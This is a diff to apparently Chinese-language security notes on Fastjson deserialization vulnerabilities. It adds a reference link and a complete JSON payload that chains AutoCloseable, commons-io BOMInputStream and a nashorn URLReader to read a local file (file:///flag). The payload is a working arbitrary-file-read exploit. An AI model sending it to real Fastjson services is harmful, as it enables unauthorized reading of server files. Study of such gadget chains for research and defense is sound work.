@@ -727,6 +727,7 @@ https://b1ue.cn/archives/364.html   **使用AutoCloseable接口造成文件操�
 
 https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**   **仿佛利用Throwable去实现不能通过{"$ref":"$.xxx"}去执行getter方法？？？**
 
+利用：https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&mid=2247485312&idx=1&sn=22dddceccf679f34705d987181a328db&token=1393640502&lang=zh_CN&scene=21#wechat_redirect
 
 - Fastjson <= 1.2.68；
 - 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；
@@ -1080,6 +1081,35 @@ commons-io 2.7 - 2.8.0
   }
 ```
 
+common-io 读文件
+
+https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg
+
+```
+
+{
+    "abc": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "org.apache.commons.io.input.BOMInputStream",
+        "delegate": {
+            "@type": "org.apache.commons.io.input.ReaderInputStream",
+            "reader": {
+                "@type": "jdk.nashorn.api.scripting.URLReader",
+                "url": "file:///flag"
+            },
+            "charsetName": "UTF-8",
+            "bufferSize": 1024
+        },
+        "boms": [{
+            "charsetName": "UTF-8",
+            "bytes": [66]
+        }]
+    },
+    "address": {
+        "$ref": "$.abc.BOM"
+    }
+}
+```
 2021黑帽大会腾讯玄武披露   
 详细漏洞原理待研究
 ```java
